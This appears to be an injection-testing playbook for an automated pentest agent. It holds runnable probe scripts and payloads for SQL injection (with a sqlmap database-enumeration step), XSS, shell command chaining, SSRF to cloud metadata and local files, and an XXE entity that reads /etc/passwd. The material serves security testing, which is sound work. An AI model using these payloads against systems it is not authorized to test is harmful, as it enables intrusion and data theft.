# Playbook: Injection Vectors (SQLi / XSS / Cmd / SSRF / XXE)

Stack-agnostic playbook for probing injection vulnerabilities. Use AFTER
you've enumerated endpoints with one of the framework playbooks above.

## SQL Injection (response-length oracle)

For any endpoint that accepts a query parameter, probe three variants and
compare response sizes. A significant delta between benign and break
inputs is a high-confidence SQLi signal.

```python
python_exec(code='''
import asyncio, httpx, urllib.parse
# Substitute the target endpoint and parameter name
endpoint = "/rest/products/search"
param = "q"
variants = [
    ("benign", "1"),
    ("quote_break", "'"),
    ("double_quote", "\""),
    ("comment", "1-- -"),
    ("or_true", "1' OR '1'='1"),
    ("or_false", "1' OR '1'='2"),
    ("union_null", "1' UNION SELECT NULL-- -"),
    ("time_mysql", "1' AND SLEEP(3)-- -"),
    ("time_pg", "1' AND PG_SLEEP(3)-- -"),
    ("boolean_eq", "1 OR 1=1"),
]
async def probe(label, payload):
    url = f"<TARGET_URL>{endpoint}?{param}={urllib.parse.quote(payload)}"
    async with httpx.AsyncClient(timeout=15, follow_redirects=False) as c:
        import time
        t0 = time.monotonic()
        try:
            r = await c.get(url)
            dt = time.monotonic() - t0
            return f"{label:12} t={dt:5.2f}s  {r.status_code} {len(r.content):>7}B  {payload[:30]}"
        except Exception as e: return f"{label:12} ERR {e}"
results = asyncio.run(asyncio.gather(*[probe(l, p) for l, p in variants]))
for r in results: print(r)
''')
```

## Interpretation

- `quote_break` returns differently (size or code) than `benign` = SQLi CONFIRMED
- `time_mysql` or `time_pg` takes 3+ seconds = blind time-based SQLi
- `or_true` returns more rows than `or_false` = boolean-based SQLi
- `union_null` returns 500 "column count" error = UNION injection viable

Report as `finding_type=sql_injection`, severity=HIGH. Then escalate:
```bash
shell_exec(command="sqlmap -u '<TARGET_URL>/rest/products/search?q=1' --batch --random-agent --level=3 --risk=2 --timeout=10 --dbs 2>&1 | tail -60", timeout=300)
```

## Reflected XSS

```python
python_exec(code='''
import asyncio, httpx
probes = [
    "<script>alert(1)</script>",
    "\"><svg onload=alert(1)>",
    "javascript:alert(1)",
    "';alert(1)//",
    "<img src=x onerror=alert(1)>",
]
params = ["q", "search", "name", "id", "input", "q[]"]
endpoints = ["/search", "/rest/products/search", "/api/search", "/?q="]
async def p(ep, param, payload):
    async with httpx.AsyncClient(timeout=5) as c:
        r = await c.get(f"<TARGET_URL>{ep}", params={param: payload})
        reflected = payload in r.text
        return f"{'REFL' if reflected else '    '} {r.status_code} {ep}?{param}={payload[:30]}"
tasks = [p(ep, pa, pl) for ep in endpoints for pa in params for pl in probes[:2]]
for r in asyncio.run(asyncio.gather(*tasks)):
    if "REFL" in r: print(r)
''')
```

## Command Injection

```python
python_exec(code='''
import asyncio, httpx, time
# Test any endpoint that accepts user-controlled strings (ping, lookup, exec)
payloads = [
    ";sleep 3",
    "|sleep 3",
    "`sleep 3`",
    "$(sleep 3)",
    "%0Asleep%203",
]
ep = "/api/ping"  # substitute actual endpoint
async def p(payload):
    t0 = time.monotonic()
    async with httpx.AsyncClient(timeout=10) as c:
        try:
            r = await c.get(f"<TARGET_URL>{ep}", params={"host": f"8.8.8.8{payload}"})
            dt = time.monotonic() - t0
            return f"t={dt:5.2f}s  {r.status_code} {payload[:20]}"
        except Exception as e: return f"ERR {e}"
for r in asyncio.run(asyncio.gather(*[p(pl) for pl in payloads])): print(r)
''')
```

3+ second delay = blind command injection confirmed.

## SSRF (Server-Side Request Forgery)

```python
python_exec(code='''
# Common SSRF probe: make the server fetch an internal/cloud metadata URL
internal_targets = [
    "http://169.254.169.254/latest/meta-data/",  # AWS IMDSv1
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://127.0.0.1:22",
    "http://localhost:8080",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO",  # Redis
]
# Target endpoint must accept a URL parameter (url, uri, target, fetch, etc.)
```

## XXE (XML External Entity)

For any endpoint that accepts XML (`Content-Type: application/xml`):
```
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

## Reporting

Each confirmed injection = separate `report_finding` call:
- `sql_injection` (severity=HIGH)
- `xss_reflected` / `xss_stored` (severity=HIGH)
- `command_injection` (severity=CRITICAL)
- `ssrf` (severity=HIGH)
- `xxe` (severity=HIGH)
